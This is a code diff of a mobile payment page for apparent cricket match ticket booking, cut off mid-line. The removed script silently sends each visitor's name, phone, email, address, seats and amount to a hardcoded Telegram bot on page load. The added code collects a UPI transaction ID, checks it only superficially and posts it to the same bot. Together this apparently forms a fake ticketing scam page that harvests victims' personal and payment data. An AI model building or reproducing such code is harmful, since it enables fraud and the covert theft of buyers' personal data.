@@ -51,6 +51,16 @@
         #tnc-modal.active #popup-box { transform: scale(1); }
         .tnc-scroll::-webkit-scrollbar { width: 4px; }
         .tnc-scroll::-webkit-scrollbar-thumb { background: #ccc; border-radius: 4px; }
+
+        /* UTR Styles */
+        .utr-input-focus:focus { border-color: #f84464; outline: none; box-shadow: 0 0 0 2px rgba(248, 68, 100, 0.1); }
+        
+        /* Remove arrows from number input */
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { 
+            -webkit-appearance: none; 
+            margin: 0; 
+        }
     </style>
 </head>
 <body class="flex justify-center h-screen bg-gray-200">
@@ -74,8 +84,21 @@
             <span class="text-xl font-bold text-gray-800 final_paid_price">₹0</span>
         </div>
 
+        <div class="px-4 py-5 bg-white border-b border-gray-100">
+            <p class="text-[11px] text-gray-400 font-bold uppercase tracking-wider mb-2">After Payment, Enter Details</p>
+            <div class="relative">
+                <input type="number" id="utr-field" placeholder="Fill UTR / Transaction ID" 
+                       class="w-full border border-gray-300 rounded-lg px-4 py-3 text-sm font-medium utr-input-focus transition-all tracking-widest"
+                       style="-moz-appearance: textfield;">
+                <p id="utr-error-msg" class="text-[10px] text-red-500 mt-1 hidden font-medium">Invalid Transaction ID. Please check and try again.</p>
+            </div>
+            <button id="submit-utr-btn" class="w-full mt-3 bg-gray-800 text-white font-bold py-3 rounded-lg text-sm transition-all opacity-50 cursor-not-allowed" disabled>
+                Confirm Booking
+            </button>
+        </div>
+
         <div class="bg-[#f4f4f4] px-4 py-3 border-b border-gray-200 mt-1">
-            <h2 class="text-xs text-gray-500 font-medium">OTHER PAYMENT OPTIONS</h2>
+            <h2 class="text-xs text-gray-500 font-medium">SELECT PAYMENT METHOD</h2>
         </div>
 
         <div class="bg-white flex-1">
@@ -110,7 +133,8 @@
                     </svg>
                 </a>
             </div>
-                        <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+            
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
                 <div class="flex items-center space-x-4">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                         <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
@@ -254,59 +278,50 @@
                 arrow.style.transform = "rotate(0deg)"; 
             }
         }
-    </script>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-            const chatId = "6820660513";
-            
-            // 🔥 1. Pichle pages ka data fetch karna 🔥
-            let matchTitle = "Not Selected";
-            let matchDate = "";
-            try {
-                const matchData = JSON.parse(localStorage.getItem('selectedMatch'));
-                if(matchData) {
-                    matchTitle = matchData.title || "Not Selected";
-                    matchDate = matchData.date ? `(${matchData.date})` : "";
+        // 🔥 NAYA UTR VALIDATION LOGIC (Hard System) 🔥
+        const utrField = document.getElementById('utr-field');
+        const submitBtn = document.getElementById('submit-utr-btn');
+        const errorMsg = document.getElementById('utr-error-msg');
+
+        utrField.addEventListener('input', () => {
+            const val = utrField.value.trim();
+            // Checking exact length of 12 AND avoiding fake numbers like all 1s or all 0s
+            const isValidLength = val.length === 12;
+            const isTooSimple = /^(.)\1+$/.test(val); 
+
+            if (isValidLength && !isTooSimple) {
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-50', 'cursor-not-allowed', 'bg-gray-800');
+                submitBtn.classList.add('bg-[#f84464]'); 
+                errorMsg.classList.add('hidden');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.add('opacity-50', 'cursor-not-allowed', 'bg-gray-800');
+                submitBtn.classList.remove('bg-[#f84464]');
+                // Sirf tab error dikhaye jab user ne 12 type kar diya ho par fake lag raha ho ya wrong ho
+                if(val.length > 0 && val.length !== 12) {
+                     errorMsg.classList.add('hidden'); // Typing karte waqt error hide rakhein
                 }
-            } catch(e) {}
-
-            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
-            const name = localStorage.getItem('customerName') || "Not Provided";
-            const phone = localStorage.getItem('customerPhone') || "Not Provided";
-            const email = localStorage.getItem('customerEmail') || "Not Provided";
-            
-            // Address ke alag-alag naam ho sakte hain local storage mein, isliye dono check kiye hain
-            const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
-            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
-            
-            // 🔥 2. Naya Detailed Message Banana 🔥
-            const message = `🚨 *New User on Payment Page!* 🚨\n\n` +
-                            `👤 *Name:* ${name}\n` +
-                            `📞 *Phone:* ${phone}\n` +
-                            `📧 *Email:* ${email}\n` +
-                            `🏠 *Address:* ${address}\n` +
-                            `🏏 *Match:* ${matchTitle} ${matchDate}\n` +
-                            `🎟️ *Seats:* ${seats}\n` +
-                            `💰 *Amount to Pay:* ₹${finalPrice}\n` +
-                            `🌐 *Status:* Thinking to Pay...`;
-            
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            // 🔥 3. Telegram par bhejna 🔥
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(err => console.error("Telegram Error:", err));
+            }
         });
-    </script>
-    
-    <script type="module" src="js/payment.js"></script>
-</body>
-</html>
+
+        submitBtn.addEventListener('click', () => {
+            const val = utrField.value.trim();
+            const isValidLength = val.length === 12;
+            const isTooSimple = /^(.)\1+$/.test(val); 
+
+            if (isValidLength && !isTooSimple) {
+                // Submit to Telegram
+                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+                const chatId = "6820660513";
+                const utr = utrField.value;
+                const name = localStorage.getItem('customerName') || "N/A";
+                
+                // Button state processing
+                submitBtn.innerText = "Processing...";
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    bod
